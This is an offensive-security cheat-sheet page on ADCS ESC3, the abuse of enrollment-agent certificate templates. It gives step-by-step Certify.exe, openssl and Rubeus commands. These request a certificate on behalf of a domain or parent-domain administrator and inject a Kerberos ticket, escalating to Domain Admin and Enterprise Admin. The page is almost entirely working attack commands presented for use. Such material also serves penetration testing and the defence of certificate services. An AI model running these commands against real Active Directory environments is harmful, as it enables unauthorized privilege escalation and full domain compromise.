# ESC3

{% hint style="info" %}
Request an enrollment agent certificate and use it to request cert on behalf of ANY user
{% endhint %}

### [**Certify**](https://github.com/GhostPack/Certify)

#### **Escalation to DA**

* <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
  //Convert from cert.pem to pfx.
  //Find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent
  Certify.exe find
  Request a cert on behalf of DA using target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name> /onbehalfof:&#x3C;domain>\administrator /enrollcert:esc3agent.pfx (/enrollcertpw:SecretPass@123) - optional
  </code></pre>
* Convert from cert.pem to pfx, request DA TGT
  * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`  (password can be empty)
* `Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /ptt` (`/password:SecretPass@123) - optional`  &#x20;

#### Escalation to EA

* <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
  //Convert from cert.pem to pfx.
  //Find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent.
  Certify.exe find
  Request a cert on behalf of DA using target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>   /onbehalfof:&#x3C;parent-domain>\administrator /enrollcert:esc3agent.pfx (/enrollcertpw:SecretPass@123) - optional
  </code></pre>
* Convert from cert.pem to pfx, request EA TGT
  * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`
* `Rubeus.exe asktgt /user:<parent-domain>\administrator /certificate:esc3user.pfx /dc:<parent-domain-dc> /ptt (/password:SecretPass@123) - optional`
